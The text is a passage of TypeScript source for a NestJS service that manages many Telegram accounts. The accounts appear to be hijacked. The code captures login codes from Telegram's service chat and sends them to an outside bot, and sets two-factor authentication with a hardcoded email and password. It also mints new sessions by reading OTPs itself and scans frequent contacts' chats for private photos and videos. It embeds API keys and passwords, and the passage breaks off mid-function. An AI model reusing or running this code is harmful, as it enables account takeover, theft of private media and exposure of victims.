{\r\n                filteredResults.outgoing++;\r\n            } else {\r\n                filteredResults.incoming++;\r\n            }\r\n\r\n            if (logAction.video) {\r\n                filteredResults.video++;\r\n            }\r\n\r\n            // Count calls per chat ID\r\n            const chatId = (log.peerId as Api.PeerUser).userId.toString();\r\n            if (!filteredResults.chatCallCounts[chatId]) {\r\n                const ent = <Api.User>await this.client.getEntity(chatId)\r\n                filteredResults.chatCallCounts[chatId] = {\r\n                    phone: ent.phone,\r\n                    username: ent.username,\r\n                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,\r\n                    count: 0\r\n                };\r\n            }\r\n            filteredResults.chatCallCounts[chatId].count++;\r\n        }\r\n        const filteredChatCallCounts = [];\r\n        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {\r\n            if (details['count'] > 4) {\r\n                let video = 0;\r\n                let photo = 0\r\n                const msgs = await this.client.getMessages(chatId, { limit: 600 })\r\n                for (const message of msgs) {\r\n                    const text = message.text.toLocaleLowerCase();\r\n                    if (!contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\r\n                        if (message.media instanceof Api.MessageMediaPhoto) {\r\n                            photo++\r\n                        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\r\n                            video++\r\n                        }\r\n                    }\r\n                }\r\n                filteredChatCallCounts.push({\r\n                    ...(details as any),\r\n                    msgs: msgs.total,\r\n                    video,\r\n                    photo,\r\n                    chatId,\r\n                })\r\n            }\r\n        }\r\n        console.log({\r\n            ...filteredResults,\r\n            chatCallCounts: filteredChatCallCounts\r\n        });\r\n\r\n        return {\r\n            ...filteredResults,\r\n            chatCallCounts: filteredChatCallCounts\r\n        };\r\n    }\r\n\r\n    async handleEvents(event: NewMessageEvent) {\r\n        if (event.isPrivate) {\r\n            if (event.message.chatId.toString() == \"777000\") {\r\n                console.log(event.message.text.toLowerCase());\r\n                console.log(\"Login Code received for - \", this.phoneNumber, '\\nActiveClientSetup - ', TelegramManager.activeClientSetup);\r\n                console.log(\"Date :\", new Date(event.message.date * 1000))\r\n                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {\r\n                //     console.log(\"LoginText: \", event.message.text)\r\n                //     const code = (event.message.text.split('.')[0].split(\"code:**\")[1].trim())\r\n                //     console.log(\"Code is:\", code);\r\n                //     try {\r\n                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);\r\n                //         console.log(\"Code Sent back\");\r\n                //     } catch (error) {\r\n                //         parseError(error)\r\n                //     }\r\n                // } else {\r\n                await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(event.message.text)}`);\r\n                // await event.message.delete({ revoke: true });\r\n                // }\r\n            }\r\n        }\r\n    }\r\n\r\n    async updatePrivacyforDeletedAccount() {\r\n        try {\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneCall(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Calls Updated\")\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"PP Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Number Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll(),\r\n                    ],\r\n                })\r\n            );\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyAbout(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"LAstSeen Updated\")\r\n        }\r\n        catch (e) {\r\n            throw e\r\n        }\r\n    }\r\n    async updateProfile(firstName: string, about: string) {\r\n        const data = {\r\n            lastName: \"\",\r\n        }\r\n        if (firstName !== undefined) {\r\n            data[\"firstName\"] = firstName\r\n        }\r\n        if (about !== undefined) {\r\n            data[\"about\"] = about\r\n        }\r\n        try {\r\n            const result = await this.client.invoke(\r\n                new Api.account.UpdateProfile(data)\r\n            );\r\n            console.log(\"Updated NAme: \", firstName);\r\n        } catch (error) {\r\n            throw error\r\n        }\r\n    }\r\n\r\n    async downloadProfilePic(photoIndex: number) {\r\n        try {\r\n            const photos = await this.client.invoke(\r\n                new Api.photos.GetUserPhotos({\r\n                    userId: 'me',\r\n                    offset: 0,\r\n                })\r\n            );\r\n\r\n            if (photos.photos.length > 0) {\r\n                console.log(`You have ${photos.photos.length} profile photos.`);\r\n\r\n                // Choose the photo index (0-based)\r\n                if (photoIndex < photos.photos.length) {\r\n                    const selectedPhoto = <Api.Photo>photos.photos[photoIndex];\r\n\r\n                    // Extract the largest photo file (e.g., highest resolution)\r\n                    const index = Math.max(selectedPhoto.sizes.length - 2, 0)\r\n                    const photoFileSize = selectedPhoto.sizes[index];\r\n\r\n                    // Download the file\r\n                    const photoBuffer = await this.client.downloadFile(\r\n                        new Api.InputPhotoFileLocation({\r\n                            id: selectedPhoto.id,\r\n                            accessHash: selectedPhoto.accessHash,\r\n                            fileReference: selectedPhoto.fileReference,\r\n                            thumbSize: photoFileSize.type\r\n                        }), {\r\n                        dcId: selectedPhoto.dcId, // Data center ID\r\n                    });\r\n\r\n                    if (photoBuffer) {\r\n                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;\r\n                        fs.writeFileSync(outputPath, photoBuffer);\r\n                        console.log(`Profile picture downloaded as '${outputPath}'`);\r\n                        return outputPath;\r\n                    } else {\r\n                        console.log(\"Failed to download the photo.\");\r\n                    }\r\n                } else {\r\n                    console.log(`Photo index ${photoIndex} is out of range.`);\r\n                }\r\n            } else {\r\n                console.log(\"No profile photos found.\");\r\n            }\r\n        } catch (err) {\r\n            console.error(\"Error:\", err);\r\n        }\r\n    }\r\n    async getLastActiveTime() {\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\r\n        let latest = 0\r\n        result.authorizations.map((auth) => {\r\n            if (!this.isAuthMine(auth)) {\r\n                if (latest < auth.dateActive) {\r\n                    latest = auth.dateActive;\r\n                }\r\n            }\r\n        });\r\n        return (new Date(latest * 1000)).toISOString().split('T')[0];\r\n    }\r\n\r\n    async getContacts() {\r\n        const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({\r\n            hash: bigInt(0)\r\n        }));\r\n        return exportedContacts;\r\n    }\r\n\r\n    async deleteChat(chatId: string) {\r\n        try {\r\n            await this.client.invoke(new Api.messages.DeleteHistory({\r\n                justClear: false,\r\n                peer: chatId,\r\n                revoke: false,\r\n            }));\r\n            console.log(`Dialog with ID ${chatId} has been deleted.`);\r\n        } catch (error) {\r\n            console.error('Failed to delete dialog:', error);\r\n        }\r\n    }\r\n\r\n    async blockUser(chatId: string) {\r\n        try {\r\n            await this.client?.invoke(new Api.contacts.Block({\r\n                id: chatId,\r\n            }));\r\n            console.log(`User with ID ${chatId} has been blocked.`);\r\n        } catch (error) {\r\n            console.error('Failed to block user:', error);\r\n        }\r\n    }\r\n\r\n    // Helper function to handle download with a timeout\r\n    downloadWithTimeout(promise: Promise<Buffer>, timeout: number) {\r\n        return Promise.race([\r\n            promise, // The actual download promise\r\n            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))\r\n        ]);\r\n    }\r\n\r\n    async getMediaMetadata(chatId: string = 'me', offset: number = undefined, limit = 100) {\r\n        try {\r\n            const query = { limit: parseInt(limit.toString()) };\r\n            if (offset) query['offsetId'] = parseInt(offset.toString());\r\n\r\n            const messages = await this.client.getMessages(chatId, query);\r\n            const mediaMessages = messages.filter(message => {\r\n                // console.log(message.media?.className)\r\n                return (message.media && message.media.className !== \"MessageMediaWebPage\")\r\n            });\r\n            console.log(\"Total:\", messages.total, \"fetched: \", messages.length, \"ChatId: \", chatId, \"Media :\", mediaMessages.length);\r\n\r\n            if (!messages.length) {\r\n                // If no media messages are returned, we might have reached the end\r\n                console.log(\"No more media messages found. Reached the end of the chat.\");\r\n                return { data: [], endOfMessages: true };\r\n            }\r\n\r\n            const data = [];\r\n\r\n            for (const message of mediaMessages) {\r\n                console.log(message.media.className, message.document?.mimeType);\r\n                let thumbBuffer = null;\r\n\r\n                try {\r\n                    if (message.media instanceof Api.MessageMediaPhoto) {\r\n                        const sizes = (<Api.Photo>message.photo)?.sizes || [1];\r\n\r\n                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);\r\n                        console.log(\"messageId image:\", message.id)\r\n                        data.push({\r\n                            messageId: message.id,\r\n                            mediaType: 'photo',\r\n                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null\r\n                        });\r\n\r\n                    } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\r\n                        const sizes = message.document?.thumbs || [1];\r\n                        console.log(\"messageId video:\", message.id)\r\n                        // const fileSize = message.document.size;\r\n\r\n                        // // Skip overly large files for thumbnail (set threshold as needed)\r\n                        // if (fileSize > 10 * 1024 * 1024) { // Skip files larger than 10MB for thumbnails\r\n                        //     console.warn(`Skipping large media file with size ${fileSize} bytes (messageId: ${message.id})`);\r\n                        //     continue;\r\n                        // }\r\n\r\n                        // Call downloadWithTimeout with a 5-second timeout\r\n                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);\r\n\r\n                        data.push({\r\n                            messageId: message.id,\r\n                            mediaType: 'video',\r\n                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null\r\n                        });\r\n                    }\r\n                } catch (downloadError) {\r\n                    if (downloadError.message === 'Download timeout') {\r\n                        console.warn(`Skipping media messageId: ${message.id} due to download timeout.`);\r\n                    } else if (downloadError.message.includes('FILE_REFERENCE_EXPIRED')) {\r\n                        console.warn('File reference expired for message. Skipping this media.');\r\n                        // Skip the expired media, continue processing others\r\n                    } else {\r\n                        console.error(`Failed to download media thumbnail for messageId: ${message.id}`, downloadError);\r\n                    }\r\n                    data.push({\r\n                        messageId: message.id,\r\n                        mediaType: 'photo',\r\n                        thumb: null, // Convert to base64 for sending over HTTP, handle null\r\n                    });\r\n\r\n                    // Skip the message and continue with the next one if there's any error\r\n                    continue;\r\n                }\r\n            }\r\n            if (!data.length) {\r\n                data.push({\r\n                    messageId: messages[messages.length - 1].id,\r\n                    mediaType: 'photo',\r\n                    thumb: null, // Convert to base64 for sending over HTTP, handle null\r\n                })\r\n            }\r\n            console.log(\"Returning \", data.length);\r\n\r\n            // Return the metadata and signal if we reached the end of messages\r\n            return { data, endOfMessages: false };\r\n\r\n        } catch (error) {\r\n            console.error('Error in getMediaMetadata:', error);\r\n            if (error.message.includes('FLOOD_WAIT')) {\r\n                const retryAfter = parseInt(error.message.match(/FLOOD_WAIT_(\\d+)/)[1], 10);\r\n                console.warn(`Rate limit hit. Retrying after ${retryAfter} seconds.`);\r\n                // Handle flood wait, retry logic\r\n                await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));\r\n                return this.getMediaMetadata(chatId, offset, limit); // Retry after waiting\r\n            }\r\n\r\n            throw new Error('Error fetching media metadata');\r\n        }\r\n    }\r\n\r\n    async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {\r\n        try {\r\n            const messages = await this.client.getMessages(chatId, { ids: [messageId] });\r\n            const message = <Api.Message>messages[0];\r\n\r\n            if (message && !(message.media instanceof Api.MessageMediaEmpty)) {\r\n                const media = message.media;\r\n                let contentType, filename, fileLocation;\r\n                const inputLocation = message.video || <Api.Photo>message.photo;\r\n\r\n                const data = {\r\n                    id: inputLocation.id,\r\n                    accessHash: inputLocation.accessHash,\r\n                    fileReference: inputLocation.fileReference,\r\n                };\r\n\r\n                if (media instanceof Api.MessageMediaPhoto) {\r\n                    contentType = 'image/jpeg';\r\n                    filename = 'photo.jpg';\r\n                    fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });\r\n                } else if (media instanceof Api.MessageMediaDocument) {\r\n                    contentType = (media as any).mimeType || 'video/mp4';\r\n                    filename = 'video.mp4';\r\n                    fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });\r\n                } else {\r\n                    return res.status(415).send('Unsupported media type');\r\n                }\r\n\r\n                res.setHeader('Content-Type', contentType);\r\n                res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\r\n\r\n                const chunkSize = 512 * 1024; // 512 KB chunks\r\n\r\n                for await (const chunk of this.client.iterDownload({\r\n                    file: fileLocation,\r\n                    offset: bigInt[0],\r\n                    limit: 5 * 1024 * 1024, // 80 MB limit\r\n                    requestSize: chunkSize,\r\n                })) {\r\n                    res.write(chunk); // Stream each chunk to the client\r\n                }\r\n                res.end();\r\n            } else {\r\n                res.status(404).send('Media not found');\r\n            }\r\n        } catch (error) {\r\n            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {\r\n                return res.status(404).send('File reference expired');\r\n            }\r\n            console.error('Error downloading media:', error);\r\n            res.status(500).send('Error downloading media');\r\n        }\r\n    }\r\n\r\n\r\n\r\n    async forwardMessage(chatId: string, messageId: number) {\r\n        try {\r\n            await this.client.forwardMessages(\"@fuckyoubabie\", { fromPeer: chatId, messages: messageId })\r\n        } catch (error) {\r\n            console.log(\"Failed to Forward Message : \", error.errorMessage);\r\n        }\r\n    }\r\n\r\n    async updateUsername(baseUsername) {\r\n        let newUserName = ''\r\n        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';\r\n        let increment = 0;\r\n        if (username === '') {\r\n            try {\r\n                const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));\r\n                console.log(`Removed Username successfully.`);\r\n            } catch (error) {\r\n                console.log(error)\r\n            }\r\n        } else {\r\n            while (increment < 10) {\r\n                try {\r\n                    const result = await this.client.invoke(\r\n                        new Api.account.CheckUsername({ username })\r\n                    );\r\n                    console.log(result, \" - \", username)\r\n                    if (result) {\r\n                        const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));\r\n                        console.log(`Username '${username}' updated successfully.`);\r\n                        newUserName = username\r\n                        break;\r\n                    } else {\r\n                        username = baseUsername + increment;\r\n                        increment++;\r\n                        await sleep(2000);\r\n                    }\r\n                } catch (error) {\r\n                    console.log(error.message)\r\n                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {\r\n                        newUserName = username;\r\n                        break;\r\n                    }\r\n                    username = baseUsername + increment;\r\n                    increment++;\r\n                    await sleep(2000);\r\n                }\r\n            }\r\n        }\r\n        return newUserName;\r\n    }\r\n\r\n    async updatePrivacy() {\r\n        try {\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneCall(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Calls Updated\")\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"PP Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyForwards(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"forwards Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Number Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"LAstSeen Updated\")\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyAbout(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n        }\r\n        catch (e) {\r\n            throw e\r\n        }\r\n    }\r\n    async getFileUrl(url: string, filename: string): Promise<string> {\r\n        const response = await axios.get(url, { responseType: 'stream' });\r\n        const filePath = `/tmp/${filename}`;\r\n        await new Promise((resolve, reject) => {\r\n            const writer = fs.createWriteStream(filePath);\r\n            response.data.pipe(writer);\r\n            writer.on('finish', () => resolve(true));\r\n            writer.on('error', reject);\r\n        });\r\n        return filePath;\r\n    }\r\n\r\n    async updateProfilePic(image) {\r\n        try {\r\n            const file = await this.client.uploadFile({\r\n                file: new CustomFile(\r\n                    'pic.jpg',\r\n                    fs.statSync(\r\n                        image\r\n                    ).size,\r\n                    image\r\n                ),\r\n                workers: 1,\r\n            });\r\n            console.log(\"file uploaded\")\r\n            await this.client.invoke(new Api.photos.UploadProfilePhoto({\r\n                file: file,\r\n            }));\r\n            console.log(\"profile pic updated\")\r\n        } catch (error) {\r\n            throw error\r\n        }\r\n    }\r\n\r\n    async hasPassword() {\r\n        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());\r\n        return passwordInfo.hasPassword\r\n    }\r\n\r\n    async set2fa() {\r\n        if (!(await this.hasPassword())) {\r\n            console.log(\"Password Does not exist, Setting 2FA\");\r\n\r\n            const imapService = MailReader.getInstance();\r\n            const twoFaDetails = {\r\n                email: \"storeslaksmi@gmail.com\",\r\n                hint: \"password - India143\",\r\n                newPassword: \"Ajtdmwajt1@\",\r\n            };\r\n\r\n            try {\r\n                await imapService.connectToMail();\r\n                const checkMailInterval = setInterval(async () => {\r\n                    console.log(\"Checking if mail is ready\");\r\n\r\n                    if (imapService.isMailReady()) {\r\n                        clearInterval(checkMailInterval);\r\n                        console.log(\"Mail is ready, checking code!\");\r\n                        await this.client.updateTwoFaSettings({\r\n                            isCheckPassword: false,\r\n                            email: twoFaDetails.email,\r\n                            hint: twoFaDetails.hint,\r\n                            newPassword: twoFaDetails.newPassword,\r\n                            emailCodeCallback: async (length) => {\r\n                                console.log(\"Code sent\");\r\n                                return new Promise(async (resolve, reject) => {\r\n                                    let retry = 0;\r\n                                    const codeInterval = setInterval(async () => {\r\n                                        try {\r\n                                            console.log(\"Checking code\");\r\n                                            retry++;\r\n                                            if (imapService.isMailReady() && retry < 4) {\r\n                                                const code = await imapService.getCode();\r\n                                                console.log('Code:', code);\r\n                                                if (code) {\r\n                                                    await imapService.disconnectFromMail();\r\n                                                    clearInterval(codeInterval);\r\n                                                    resolve(code);\r\n                                                }\r\n                                            } else {\r\n                                                clearInterval(codeInterval);\r\n                                                await imapService.disconnectFromMail();\r\n                                                reject(new Error(\"Failed to retrieve code\"));\r\n                                            }\r\n                                        } catch (error) {\r\n                                            clearInterval(codeInterval);\r\n                                            await imapService.disconnectFromMail();\r\n                                            reject(error);\r\n                                        }\r\n                                    }, 10000);\r\n                                });\r\n                            },\r\n                            onEmailCodeError: (e) => {\r\n                                console.error('Email code error:', parseError(e));\r\n                                return Promise.resolve(\"error\");\r\n                            }\r\n                        });\r\n\r\n                        return twoFaDetails;\r\n                    } else {\r\n                        console.log(\"Mail not ready yet\");\r\n                    }\r\n                }, 5000);\r\n            } catch (e) {\r\n                console.error(\"Unable to connect to mail server:\", parseError(e));\r\n            }\r\n        } else {\r\n            console.log(\"Password already exists\");\r\n        }\r\n    }\r\n\r\n\r\n    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const filePath = await this.getFileUrl(url, filename);\r\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\r\n        await this.client.sendFile(id, { file, caption });\r\n    }\r\n\r\n    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const filePath = await this.getFileUrl(url, filename);\r\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\r\n        await this.client.sendFile(id, { file, caption });\r\n    }\r\n\r\n    async deleteProfilePhotos() {\r\n        try {\r\n            const result = await this.client.invoke(\r\n                new Api.photos.GetUserPhotos({\r\n                    userId: \"me\"\r\n                })\r\n            );\r\n            console.log(`Profile Pics found: ${result.photos.length}`)\r\n            if (result && result.photos?.length > 0) {\r\n                const res = await this.client.invoke(\r\n                    new Api.photos.DeletePhotos({\r\n                        id: <Api.TypeInputPhoto[]><unknown>result.photos\r\n                    }))\r\n            }\r\n            console.log(\"Deleted profile Photos\");\r\n        } catch (error) {\r\n            throw error\r\n        }\r\n    }\r\n\r\n    async createNewSession(): Promise<string> {\r\n        const me = <Api.User>await this.client.getMe();\r\n        console.log(\"Phne:\", me.phone);\r\n        const newClient = new TelegramClient(new StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {\r\n            connectionRetries: 1,\r\n        });\r\n        await newClient.start({\r\n            phoneNumber: me.phone,\r\n            password: async () => \"Ajtdmwajt1@\",\r\n            phoneCode: async () => {\r\n                console.log('Waiting for the OTP code from chat ID 777000...');\r\n                return await this.waitForOtp();\r\n            },\r\n            onError: (err: any) => { throw err },\r\n\r\n        });\r\n\r\n        const session = <string><unknown>newClient.session.save();\r\n        await newClient.disconnect();\r\n        // await newClient.destroy();\r\n        console.log(\"New Session: \", session)\r\n        return session\r\n    }\r\n\r\n    async waitForOtp() {\r\n        for (let i = 0; i < 3; i++) {\r\n            try {\r\n                console.log(\"Attempt : \", i)\r\n                const messages = await this.client.getMessages('777000', { limit: 1 });\r\n                const message = messages[0];\r\n                if (message && message.date && message.date * 1000 > Date.now() - 60000) {\r\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\r\n                    console.log(\"returning: \", code)\r\n                    return code;\r\n                } else {\r\n                    console.log(\"Message Date: \", new Date(message.date * 1000).toISOString(), \"Now: \", new Date(Date.now() - 60000).toISOString());\r\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\r\n                    console.log(\"Skipped Code: \", code);\r\n                    if (i == 2) {\r\n                        return code;\r\n                    }\r\n                    await sleep(5000)\r\n                }\r\n            } catch (err) {\r\n                await sleep(2000)\r\n                console.log(err)\r\n            }\r\n        }\r\n    }\r\n}\r\nexport default TelegramManager;\r\n","import { ApiProperty } from \"@nestjs/swagger\";\r\n\r\nexport class AddContactDto {\r\n    @ApiProperty({\r\n        description: 'The mobile number of the user for authentication',\r\n        example: '+1234567890',\r\n    })\r\n    mobile: string;\r\n\r\n    @ApiProperty({\r\n        description: 'List of phone numbers to add as contacts',\r\n        type: Object,\r\n        example: [\r\n            {\r\n                mobile: '+1234567890',\r\n                tgId: \"1234567890\"\r\n            }\r\n        ],\r\n    })\r\n    data: { mobile: string, tgId: string }[];\r\n\r\n    @ApiProperty({\r\n        description: 'Prefix for automated contact names',\r\n        example: 'Contact',\r\n    })\r\n    prefix: string;\r\n}","import { ApiProperty } from \"@nestjs/swagger\";\r\n\r\nexport class AddContactsDto {\r\n    @ApiProperty({\r\n        description: 'The mobile number of the user for authentication',\r\n        example: '+1234567890',\r\n    })\r\n    mobile: string;\r\n\r\n    @ApiProperty({\r\n        description: 'List of phone numbers to add as contacts',\r\n        type: Object,\r\n        example: [\r\n            \"919892184284\", \"919967837841\", \"919972600626\",\r\n        ],\r\n    })\r\n    phoneNumbers: string[];\r\n\r\n    @ApiProperty({\r\n        description: 'Prefix for automated contact names',\r\n        example: 'Contact',\r\n    })\r\n    prefix: string;\r\n}","import { Module, forwardRef } from '@nestjs/common';\r\nimport { TgSignupController } from './tgSignup.controller';\r\n\r\n@Module({\r\n    imports: [],\r\n    controllers: [TgSignupController]\r\n})\r\nexport class TgSignupModule { }\r\n","import { Api } from \"telegram/tl\";\r\nimport { TelegramClient } from \"telegram\";\r\nimport { StringSession } from \"telegram/sessions\";\r\nimport axios from \"axios\";\r\nimport { sleep } from \"telegram/Helpers\";\r\nimport { computeCheck } from \"telegram/Password\";\r\nimport bigInt from \"big-integer\";\r\nimport { LogLevel } from \"telegram/extensions/Logger\";\r\nimport { parseError } from \"../../utils\";\r\nimport { BadRequestException } from \"@nestjs/common\";\r\n\r\nconst clients = new Map();\r\nlet creds = [\r\n    {\r\n        apiId: 27919939,\r\n        apiHash: \"5ed3834e741b57a560076a1d38d2fa94\"\r\n    },\r\n    {\r\n        apiId: 25328268,\r\n        apiHash: \"b4e654dd2a051930d0a30bb2add80d09\"\r\n    },\r\n    {\r\n        apiId: 2899,\r\n        apiHash: \"36722c72256a24c1225de00eb6a1ca74\"\r\n    },\r\n    {\r\n        apiId: 24559917,\r\n        apiHash: \"702294de6c08f4fd8c94c3141e0cebfb\"\r\n    },\r\n    {\r\n        apiId: 12777557,\r\n        apiHash: \"05054fc7885dcfa18eb7432865ea3500\"\r\n    },\r\n    {\r\n        apiId: 27565391,\r\n        apiHash: \"a3a0a2e895f893e2067dae111b20f2d9\"\r\n    },\r\n    // {\r\n    //     apiId: 23195238,\r\n    //     apiHash: \"15a8b085da74163f158eabc71c55b000\"\r\n    // },\r\n    {\r\n        apiId: 27586636,\r\n        apiHash: \"f020539b6bb5b945186d39b3ff1dd998\"\r\n    },\r\n    {\r\n        apiId: 29210552,\r\n        apiHash: \"f3dbae7e628b312c829e1bd341f1e9a9\"\r\n    }\r\n]\r\n\r\n// const apiId = 24559917 || parseInt(process.env.API_ID);\r\n// const apiHash = \"702294de6c08f4fd8c94c3141e0cebfb\" || process.env.API_HASH;\r\n\r\nexport async function restAcc(phoneNumber) {\r\n    await sleep(1000);\r\n    console.log(\"Reset - \", phoneNumber);\r\n    const client: TgSignupService = getClient(phoneNumber)\r\n    if (client) {\r\n        await client.client?.destroy();\r\n        await client.client?.disconnect();\r\n        client.client.session.delete();\r\n        client.session.delete();\r\n        client.client._destroyed = true;\r\n        client.client = null;\r\n        delete client['client'];\r\n        await deleteClient(phoneNumber);\r\n    }\r\n}\r\n\r\nexport function getClient(number): TgSignupService {\r\n    return clients.get(number);\r\n}\r\n\r\nexport async function hasClient(number) {\r\n    return clients.has(number);\r\n}\r\n\r\nfunction contains(str, arr) {\r\n    return (arr.some(element => {\r\n        if (str?.includes(element)) {\r\n            return true;\r\n        }\r\n        return false;\r\n    }))\r\n};\r\n\r\nexport async function deleteClient(number) {\r\n    console.log(\"Deleting Client - \", number);\r\n    const cli = getClient(number);\r\n    await cli?.disconnect();\r\n    return clients.delete(number);\r\n}\r\n\r\nexport async function disconnectAll() {\r\n    for (const [phoneNumber, client] of clients.entries()) {\r\n        try {\r\n            await client?.disconnect();\r\n            clients.delete(phoneNumber);\r\n            console.log(`Client disconnected: ${phoneNumber}`);\r\n        } catch (error) {\r\n            console.log(error);\r\n            console.log(`Failed to Disconnect : ${phoneNumber}`);\r\n        }\r\n    }\r\n}\r\n\r\nexport async function createClient(number) {\r\n    try {\r\n        if (clients.has(number)) {\r\n            console.log(\"Client already exist\");\r\n            const cli: TgSignupService = clients.get(number);\r\n            setTimeout(async () => {\r\n                await restAcc(number)\r\n            }, 120000);\r\n            return (await cli.sendCode(false));\r\n        } else {\r\n            const randomIndex = Math.floor(Math.random() * creds.length);\r\n            const apiHash = creds[randomIndex].apiHash\r\n            const apiId = creds[randomIndex].apiId\r\n            console.log(\"Creating new client - \", number, creds[randomIndex]);\r\n            const cli = new TgSignupService(number, apiId, apiHash);\r\n            clients.set(number, cli);\r\n            await sleep(500)\r\n            return (await cli.sendCode(false));\r\n        }\r\n    } catch (error) {\r\n        console.log(parseError(error))\r\n        throw new BadRequestException(parseError(error).message)\r\n    }\r\n}\r\n\r\nexport class TgSignupService {\r\n    session: any;\r\n    phoneNumber: any;\r\n    client: TelegramClient;\r\n    phoneCodeHash: any;\r\n    apiId: number;\r\n    apiHash: string;\r\n    constructor(number: any, apiId: number, apiHash: string) {\r\n        this.apiId = apiId;\r\n        this.apiHash = apiHash;\r\n        this.phoneNumber = number;\r\n        this.session = new StringSession('');\r\n        this.client = null;\r\n        this.createClient();\r\n    }\r\n\r\n    async getLastActiveTime() {\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\r\n        let latest = 0\r\n        result.authorizations.map((auth) => {\r\n            if (!auth.country.toLowerCase().includes('singapore')) {\r\n                if (latest < auth.dateActive) {\r\n                    latest = auth.dateActive;\r\n                }\r\n            }\r\n        })\r\n        return latest\r\n    }\r\n\r\n    async disconnect() {\r\n        await this.client?.disconnect();\r\n        await this.client?.destroy();\r\n        await this.session.delete();\r\n        this.client = null\r\n    }\r\n\r\n    async createClient() {\r\n        try {\r\n            console.log(this.apiId, this.apiHash)\r\n            this.client = new TelegramClient(this.session, this.apiId, this.apiHash, {\r\n                connectionRetries: 5,\r\n            });\r\n            await this.client.setLogLevel(LogLevel.ERROR);\r\n            await this.client.connect();\r\n        } catch 